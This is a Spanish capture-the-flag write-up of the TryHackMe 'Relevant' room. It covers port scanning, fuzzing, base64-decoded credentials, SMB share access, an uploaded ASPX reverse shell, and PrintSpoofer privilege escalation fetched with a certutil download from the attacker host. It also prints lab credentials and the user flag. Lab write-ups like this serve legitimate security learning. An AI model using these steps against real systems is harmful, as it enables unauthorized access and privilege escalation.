# Relevant (thm)

Empezamos con un scaneo de todos los puertos con 

```nmap -p- --min-rate=1000 -T4 <IP>```


![alt text](image.png)

Ahora vamos a hacer un escaneo más profundo en esos puertos

```bash
nmap -sV -A -T4 <IP> -p <Puertos>
```

![alt text](image-1.png)

![alt text](image-2.png)

Podemos ver que hay:

- Servidor http en puerto 80
- Microsoft RPC en puerto 135
- netbios-ssn puerto 445
- ms-wbt-server puerto 3389
- Servidor http en 49663
- msrpc 49668
- Tiene samba


Empezamos con las dos servidores web


**Puerto 80**

Parece que no tiene nada tan soloo un enlace

![alt text](image-4.png)

 Tampoco tiene directorios parece.
![alt text](image-3.png)

**Puerto 49663**

En principio parece la misma página 

![alt text](image-5.png)

Haciendo varios fuzeos he encontrado unos directorios pero no he encontrado nada en ellos 

![alt text](image-9.png)

Voy a probar con un diccionario más grande en la raiz de la url a ver

![alt text](image-13.png)

Se puede ver un nuevo direcotrio que sea `nt4wrksv`

![alt text](image-15.png)

Haciendo fuzeo a ese directorio se puede ver que hay un archivo passwords.txt

![alt text](image-14.png)

Parece que la primera es un base64 ya que tiene dos iguales (==) al final. Son los dos base64

![alt text](image-10.png)

Sacamos que 


```
Bob - !P@$$W0rD!123

Bill - Juw4nnaM4n420696969!$$$ 
```

**Samba**

Vamos a usar este comando para ver qué recursos compartidos están disponibles:

```bash
smbclient -L //10.10.100.207 -N
```
![alt text](image-6.png)

Ahora nos conectamos al recurso que hemos visto y haciendo un `ls` hay un passwords.txt

![alt text](image-7.png)

Haciendo un more password.txt es la única forma de leerlo, se puede ver que es el mismo archivo que la pagina web y creo que podemos hacer una reverseshell ahi

![alt text](image-8.png)



Se pueden acceder con los dos usuarios

![alt text](image-11.png)

![alt text](image-12.png)


Ahora voy a probar a crear un nuevo archivo a ver si se refleja en la web para poder intenetar hacer una reverse shell

![alt text](image-16.png)

![alt text](image-17.png)


Ahora despues de buscar en payloadallthethings la reverse shell de tcp por windows

![](reverse.png)

No ha funcionado eso pero he buscado en otra pagina y puede funcionar una de aspx

![alt text](image-18.png)

Ninguna funciona pero le he preguntado a perplexity y me ha dado esta que si funciona

![alt text](image-21.png)

![alt text](image-20.png)

Luego buscamos en el navegador el archivo

![alt text](image-22.png)

Y con el netcat abierto sale la terminal ya

![alt text](image-23.png)

Aqui tenemos la primera flag 

![alt text](image-24.png)

THM{fdk4ka34vk346ksxfr21tg789ktf45}


![alt text](image-25.png)

Vamos a descargar PrintSpoofer.exe

![alt text](image-26.png)

Lo metemos en samba

![alt text](image-27.png)

Levantamos en esa carpeta una web con python = python3 -m http.server 80

Luego usamos esto 

`certutil -urlcache -f http://<IP_Kali>/PrintSpoofer64.exe printspoofer.exe`

Y ejecutamos en la termninal `PrintSpoofer64.exe -i -c cmd` y nos hacemos root
![alt text](image-28.png)

La flag esta en `C:\Users\Administrator\Desktop\root.txt`

![alt text](image-29.png)